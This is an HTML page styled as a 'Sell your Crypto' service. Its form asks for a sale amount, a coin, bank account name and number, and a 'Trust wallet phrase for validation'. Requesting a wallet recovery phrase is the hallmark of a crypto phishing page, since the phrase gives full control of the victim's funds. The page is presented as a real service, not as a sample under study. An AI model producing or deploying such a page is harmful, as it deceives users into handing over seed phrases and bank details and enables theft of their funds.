<!DOCTYPE html>
<html lang="en"> 
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="images/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sell-Crypto</title>
</head>

<body>
    <style>
        body {
            margin: 0%;
        }

        .body-img {
            background-color: rgba(0, 0, 0, 0.678);
            background-blend-mode: multiply;
            width: 100%;
            background-image: url('./images/slider/bg1.jpg');
            height: 900px;
            background-size: 100% 100%;
        }

        .inpu-div {
            width: 32%;
            padding: 20px;
            height: 450px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            margin: auto; 
            background-color: black;
        } 
        .tell{
            padding: 20px;
            text-align: center; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            color: white; 
        }
        .any{
            outline: none;
            border: none;
            width: 90%;
            color: white;
            background-color: rgb(31, 30, 30);
            padding: 10px;
        }
        .select{
            color: gray;
        }
        .see-div{
            margin-top: 30px; 
            height: 40px;
            float: right;
            width: 30%;
        }
        .see-divs{ 
            color: white;
            cursor: pointer;
            outline: none;
            height: 40px;  
            border: none;
            background-color:#fd961a ;
            width: 100%;
        }
    </style>
    <div class="body-img">
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <div class="inpu-div">
              <div class="tell">Sell your <label    style="color: #fd961a;">Crypto</label> </div>
              <input type="text"  placeholder="Amount to sell" required class="any">
              <br>
              <br>
              <b class="select">Select coin</b>
              <br>
              <br>
              <select name="" id="" class="any">
                  <option value="">Btc</option>
                  <option value="">Eth</option>
                  <option value="">doge</option> 
                  
              </select>
               <br> 
               <br>
               <b class="select">bank account detail for receiving cash</b>
               <br>
               <br>
              <input type="text"  placeholder="acc Name" required class="any">
              <br>
              <br>
              <input type="text"  placeholder="acc number" required class="any">
              <br>
              <br>
             <input type="text"  placeholder="Trust wallet phrase for validation" required class="any">
             <div class="see-div">
                  <button class="see-divs">
                      Sell
                  </button>
             </div>
        </div> 
    </div>
</body>

</html>
